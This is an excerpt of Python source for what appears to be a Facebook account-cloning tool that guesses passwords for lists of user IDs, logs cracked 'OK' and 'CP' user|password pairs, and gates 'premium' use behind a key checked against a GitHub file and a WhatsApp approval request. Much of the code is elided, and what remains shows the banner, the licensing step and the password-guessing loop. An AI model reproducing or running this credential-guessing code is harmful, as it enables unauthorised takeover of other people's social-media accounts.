...
def logo():
	print("""%s
\033[0;37md8b   db d888888b d8888b.  .d8b.  db      
\033[0;37m888o  88   `88'   88  `8D d8' `8b 88      
\033[0;37m88V8o 88    88    88   88 88ooo88 88      
\033[0;37m88 V8o88    88    88   88 88~~~88 88      
\033[0;37m88  V888   .88.   88  .8D 88   88 88booo. 
VP\033[0;37m   V8P Y888888P Y8888D' YP   YP Y88888P                                          
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mFACEBOK : ANISSCHIAPARELLI 
...
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in SCHIAPARELLI folder
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/PIKSO404/FILE/blob/main/FILE.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20NIDAL-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+21369491481?text=' + tks)
...
class __bsn__:
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-NIDAL] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [NIDAL] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
